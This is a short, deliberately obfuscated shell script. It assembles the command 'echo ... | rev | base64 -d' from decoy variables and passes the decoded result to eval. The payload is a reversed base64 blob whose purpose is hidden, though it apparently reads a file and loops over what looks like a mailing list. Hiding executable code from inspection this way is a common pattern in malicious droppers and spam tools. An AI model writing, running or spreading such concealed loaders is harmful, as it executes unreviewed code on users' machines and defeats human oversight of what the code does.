gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'l52bkpgIwhGcuQmblNnIgAHawBCIgACIKkmZgACIgoAdphXZgACIgACIgACIgACIK4WZoRHIgACIKsTXgQHe05CdzlGbpFWbvQ3cpxGIz1CIhAyWgYWagACIgAiCvRmC7kSdkASMgEXZzhCJg4WagkGIy9mZKAmIxICIrAiIuRiIgIHc4VGY9UnCgJCdvRHJiAyLgISYkICIyBHelBWPupAYn0HIxQCI05WayBHI7dCIrdXYgwHInQHe05CdzlGbpFWbvQ3cpx2JgwWLgM2dg1TYKICY0hHduQmblNnclB3Lu9Wa0Nmb1ZGI0F2YgJSP09Gd
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
